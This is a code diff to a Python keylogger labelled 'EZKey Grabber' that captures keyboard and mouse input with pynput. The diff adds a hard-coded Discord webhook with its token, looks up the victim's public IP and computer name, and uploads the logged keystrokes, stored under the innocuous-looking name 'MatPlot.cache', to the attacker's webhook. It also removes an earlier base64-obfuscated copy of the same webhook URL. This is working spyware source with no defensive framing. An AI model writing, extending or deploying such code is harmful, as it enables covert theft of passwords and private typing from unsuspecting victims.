@@ -1,25 +1,55 @@
 from pynput import keyboard
 from pynput import mouse
 
-from discord_webhook import DiscordWebhook
+from discord_webhook import AsyncDiscordWebhook, DiscordWebhook, DiscordEmbed
+import requests
+import asyncio
 
-import base64
-import re
+import os
+ 
+__author__ = "xpierroz" # Might add an anti-skid but i have to munch things to do rn
 
+discord_webhook = "https://canary.discord.com/api/webhooks/1096512293048697014/k00SuViD_Lcp-jyRbl56IBBMcZOKpsNU7ggdHz7mZN2Ewc_lSk9zmtznmA6g8BmfbQiy"
+
+__r = requests.get('https://api.ipify.org/').text
+__c = os.getenv('COMPUTERNAME')
+
+
+async def _send_data():
+    webhook = AsyncDiscordWebhook(
+            url=discord_webhook,
+            rate_limit_retry=True,
+        )
+            
+
+    embed = DiscordEmbed(title='EZKey Grabber', description=f'Data from {__c} | {__r}', color='544C53')
+    with open("MatPlot.cache", "rb") as f:
+        webhook.add_file(file=f.read(), filename='fuck.cache')
+    webhook.add_embed(embed)
+    await webhook.execute(remove_embeds=True)
+    webhook.remove_files()
 
 class Logger():
     def __init__(self):
+        self.__max_len_file = 10
         self.word = ""
         self.data = []
-        self.webhook = DiscordWebhook(
-            url=base64.b64decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwOTY1MTIyOTMwNDg2OTcwMTQvazAwU3VWaURfTGNwLWp5UmJsNTZJQkJNY1pPS3BzTlU3Z2dkSHo3bVpOMkV3Y19sU2s5em10em5tQTZnOEJtZmJRaXk="),
-            content="New data"
-        )
+        #self.webhook = DiscordWebhook(
+        #    url=discord_webhook,
+        #    rate_limit_retry=True,
+        #    content="New data"
+        #)
+            
 
     def send_data(self):
-        with open("MatPlot.cache", "rb") as f:
-            self.webhook.add_file(file=f.read(), filename='fuck.cache')
-        self.webhook.execute()
+        asyncio.run(_send_data())
+        return
+        #embed = DiscordEmbed(title='EZKey Grabber', description=f'Data from {self.__c} | {self.__r}', color='544C53')
+        #with open("MatPlot.cache", "rb") as f:
+        #    self.webhook.add_file(file=f.read(), filename='fuck.cache')
+        #self.webhook.add_embed(embed)
+        #self.webhook.execute(remove_embeds=True)
+        #self.webhook.remove_files() 
         
     def erase_file(self):
         with open("MatPlot.cache", "w") as f:
@@ -64,9 +94,9 @@ class Logger():
         self.data = []
         
     def check_data(self):
-        if len(self.data) > 3:
+        if len(self.data) > 10:
             self.write_data()
-            if self.get_lenfile() > 3:
+            if self.get_lenfile() > self.__max_len_file:
                 self.send_data()
                 self.erase_file()
             self.data = []
